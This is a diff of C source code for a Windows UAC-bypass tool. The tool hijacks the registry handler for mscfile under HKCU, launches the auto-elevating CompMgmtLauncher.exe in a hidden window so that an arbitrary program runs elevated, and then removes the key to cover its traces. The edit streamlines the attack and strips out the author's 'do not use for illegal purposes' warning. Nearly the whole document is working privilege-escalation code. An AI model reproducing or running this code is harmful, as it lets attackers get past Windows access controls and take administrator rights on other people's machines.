@@ -7,20 +7,19 @@
 
 #define DATA_SIZE 1024
 
-typedef VOID  (WINAPI * PFN_GetNativeSystemInfo)(OUT  LPSYSTEM_INFO);
-typedef BOOL   (WINAPI * PFN_Wow64DisableWow64FsRedirection)(OUT  PVOID*);
-typedef BOOL  (WINAPI * PFN_Wow64RevertWow64FsRedirection)(OUT  PVOID);
+typedef VOID(WINAPI * PFN_GetNativeSystemInfo)(OUT  LPSYSTEM_INFO);
+typedef BOOL(WINAPI * PFN_Wow64DisableWow64FsRedirection)(OUT  PVOID*);
+typedef BOOL(WINAPI * PFN_Wow64RevertWow64FsRedirection)(OUT  PVOID);
 
 BOOL Is64System();
-BOOL SetRegKeyStrVal(HKEY hKey,LPCSTR lpSubKey,LPCSTR lpData);
-BOOL DeleteRegKey(HKEY hKey,LPCSTR lpSubKey);
-VOID BypassUac(CHAR* lpData, DWORD dwIndex);
-VOID PrintLove();
+BOOL SetRegKeyStrVal(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpData);
+BOOL DeleteRegKey(HKEY hKey, LPCSTR lpSubKey);
+VOID BypassUac(CHAR* lpData);
 VOID Help();
 
 BOOL Is64System()
 {
-	SYSTEM_INFO si = {0};
+	SYSTEM_INFO si = { 0 };
 
 	PFN_GetNativeSystemInfo pfnGetNativeSystemInfo = \
 		(PFN_GetNativeSystemInfo)GetProcAddress(GetModuleHandle("Kernel32.dll"), "GetNativeSystemInfo");
@@ -39,16 +38,16 @@ BOOL Is64System()
 	return FALSE;
 }
 
-BOOL SetRegKeyStrVal(HKEY hKey,LPCSTR lpSubKey,LPCSTR lpData)
+BOOL SetRegKeyStrVal(HKEY hKey, LPCSTR lpSubKey, LPCSTR lpData)
 {
 	HKEY hRoot = NULL;
 	DWORD dwDisposition = 0;
 	DWORD cbData = 0;
 	DWORD dwRet = 0;
 	REGSAM samDesired = KEY_ALL_ACCESS;
-	BYTE szBuffer[MAX_PATH] = {0};
-	CHAR szSysDir[MAX_PATH] = {0};
-	CHAR szCommand[MAX_PATH] = {0};
+	BYTE szBuffer[MAX_PATH] = { 0 };
+	CHAR szSysDir[MAX_PATH] = { 0 };
+	CHAR szCommand[MAX_PATH] = { 0 };
 
 
 	if (Is64System())
@@ -56,30 +55,30 @@ BOOL SetRegKeyStrVal(HKEY hKey,LPCSTR lpSubKey,LPCSTR lpData)
 		samDesired |= KEY_WOW64_64KEY;
 	}
 
-	if ((RegCreateKeyEx(hKey, lpSubKey, 0, NULL, 0, samDesired,NULL, &hRoot,&dwDisposition)) != ERROR_SUCCESS)
+	if ((RegCreateKeyEx(hKey, lpSubKey, 0, NULL, 0, samDesired, NULL, &hRoot, &dwDisposition)) != ERROR_SUCCESS)
 	{
 		return FALSE;
 	}
 
-	dwRet = RegQueryValueEx( hRoot,
+	dwRet = RegQueryValueEx(hRoot,
 		NULL,
 		NULL,
 		NULL,
 		szBuffer,
-		&cbData );
+		&cbData);
 
 	if (dwRet == ERROR_SUCCESS || dwRet == ERROR_MORE_DATA)
 	{
-		RegDeleteKey(hKey,lpSubKey);
+		RegDeleteKey(hKey, lpSubKey);
 		RegCloseKey(hRoot);
 
-		if ((RegCreateKeyEx(hKey, lpSubKey, 0, NULL, 0, samDesired,NULL, &hRoot,&dwDisposition)) != ERROR_SUCCESS)
+		if ((RegCreateKeyEx(hKey, lpSubKey, 0, NULL, 0, samDesired, NULL, &hRoot, &dwDisposition)) != ERROR_SUCCESS)
 		{
 			return FALSE;
 		}
 	}
 
-	if (RegSetValueEx(hRoot,NULL,0,REG_SZ, (BYTE *)lpData,strlen(lpData)))
+	if (RegSetValueEx(hRoot, NULL, 0, REG_SZ, (BYTE *)lpData, strlen(lpData)))
 	{
 		return FALSE;
 	}
@@ -92,15 +91,15 @@ BOOL SetRegKeyStrVal(HKEY hKey,LPCSTR lpSubKey,LPCSTR lpData)
 	return TRUE;
 }
 
-BOOL DeleteRegKey(HKEY hKey,LPCSTR lpSubKey)
+BOOL DeleteRegKey(HKEY hKey, LPCSTR lpSubKey)
 {
 	HKEY hRoot = NULL;
 	DWORD  dwDisposition = 0;
 
-	if (RegCreateKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, NULL,0,KEY_ALL_ACCESS,NULL,&hRoot,&dwDisposition) != ERROR_SUCCESS)
+	if (RegCreateKeyEx(HKEY_CURRENT_USER, lpSubKey, 0, NULL, 0, KEY_ALL_ACCESS, NULL, &hRoot, &dwDisposition) != ERROR_SUCCESS)
 		return FALSE;
 
-	if (RegDeleteKey(hKey,lpSubKey) != ERROR_SUCCESS)
+	if (RegDeleteKey(hKey, lpSubKey) != ERROR_SUCCESS)
 		return FALSE;
 
 	if (RegCloseKey(hRoot) != ERROR_SUCCESS)
@@ -109,57 +108,45 @@ BOOL DeleteRegKey(HKEY hKey,LPCSTR lpSubKey)
 	return TRUE;
 }
 
-VOID BypassUac(CHAR* lpData, DWORD dwIndex)
+VOID BypassUac(CHAR* lpData)
 {
-	CHAR szSysDir[MAX_PATH] = {0};
-	CHAR szSysCmd[DATA_SIZE] = {0};
-	CHAR szData[DATA_SIZE] = {0};
+	CHAR szSysDir[MAX_PATH] = { 0 };
+	CHAR szSysCmd[DATA_SIZE] = { 0 };
+	CHAR szData[DATA_SIZE] = { 0 };
 
 	CONST CHAR* lpSubKey = "Software\\Classes\\mscfile\\shell\\open\\command";
 
 	GetSystemDirectory(szSysDir, MAX_PATH);
 
-	sprintf_s(szData, DATA_SIZE, "%s\\cmd.exe /c %s", szSysDir, lpData);
+	//sprintf_s(szData, DATA_SIZE, "%s\\cmd.exe /c %s", szSysDir, lpData);
+	sprintf_s(szData, DATA_SIZE, "%s", lpData);
 
-	SetRegKeyStrVal(HKEY_CURRENT_USER , lpSubKey, szData);
+	SetRegKeyStrVal(HKEY_CURRENT_USER, lpSubKey, szData);
 
-	switch(dwIndex)
-	{
-	case 0:
-		sprintf_s(szSysCmd, DATA_SIZE,"%s\\cmd.exe /c %s\\%s", szSysDir, szSysDir, "CompMgmtLauncher.exe");
-		break;
-	case 1:
-		sprintf_s(szSysCmd, DATA_SIZE,"%s\\cmd.exe /c %s\\%s", szSysDir, szSysDir, "EventVwr.exe");
-		break;
-	default:
-		sprintf_s(szSysCmd, DATA_SIZE,"%s\\cmd.exe /c %s\\%s", szSysDir, szSysDir, "EventVwr.exe");
-		break;
-	}
 
-	system(szSysCmd);
+	sprintf_s(szSysCmd, DATA_SIZE, "%s\\cmd.exe /c %s\\%s", szSysDir, szSysDir, "CompMgmtLauncher.exe");
+	//sprintf_s(szSysCmd, DATA_SIZE, "%s\\cmd.exe /c %s\\%s", szSysDir, szSysDir, "EventVwr.exe");
 
-	DeleteRegKey(HKEY_CURRENT_USER , lpSubKey);
+	ShellExecute(NULL, TEXT("open"), "CompMgmtLauncher.exe", NULL, NULL, SW_HIDE);
+	//system("CompMgmtLauncher.exe");
+	//system(szSysCmd);
+
+	Sleep(1000);
+	DeleteRegKey(HKEY_CURRENT_USER, lpSubKey);
 }
 
 VOID Help()
 {
 	HANDLE handle = GetStdHandle(STD_OUTPUT_HANDLE);
-	SetConsoleTextAttribute(handle, 2);
-	printf("fixed By mekolr. \tBy ExpLife\r\n");
-	SetConsoleTextAttribute(handle, 3);
+	//SetConsoleTextAttribute(handle, 2);
+	printf("Fixed by Mekolr\r\n");
 	printf("Usage: XXX.exe TheFullPathOfTarget Number\r\n");
-	SetConsoleTextAttribute(handle, 4);
-	printf("The number parameter can be 0 or 1\r\n");
-	printf("The number 0 means to use CompMgmtLauncher.exe\r\n");
-	printf("The number 1 means to use EventVwr.exe\r\n");
-	SetConsoleTextAttribute(handle, 5);
-	printf("Do not use for illegal purposes, or author is not responsible for the consequences!\r\n");
 }
 
-int main(int argc , char * argv[])
-{		
-	if (argc != 3)
-	{	
+int main(int argc, char * argv[])
+{
+	if (argc != 2)
+	{
 		Help();
 		return 0;
 	}
@@ -172,15 +159,15 @@ int main(int argc , char * argv[])
 	}
 
 	DWORD dwIndex = 0;// StrToInt(argv[2]);
-	if (dwIndex != 0 && dwIndex != 1)
+	/*if (dwIndex != 0 && dwIndex != 1)
 	{
 		Help();
 		printf("The second parameter invaild.\r\n");
 		return 0;
-	}
+	}*/
 
 	if (Is64System())
-	{	
+	{
 		PFN_Wow64DisableWow64FsRedirection pfnWow64DisableWow64FsRedirection = \
 			(PFN_Wow64DisableWow64FsRedirection)GetProcAddress(GetModuleHandle("Kernel32.dll"), "Wow64DisableWow64FsRedirection");
 
@@ -193,14 +180,14 @@ int main(int argc , char * argv[])
 
 			pfnWow64DisableWow64FsRedirection(&OldValue);
 
-			BypassUac(argv[1], dwIndex);
+			BypassUac(argv[1]);
 
-			pfnWow64RevertWow64FsRedirection (OldValue);
+			pfnWow64RevertWow64FsRedirection(OldValue);
 
 			return 0;
 		}
 	}
-	
-	BypassUac(argv[1], dwIndex);
+
+	BypassUac(argv[1]);
 }
 
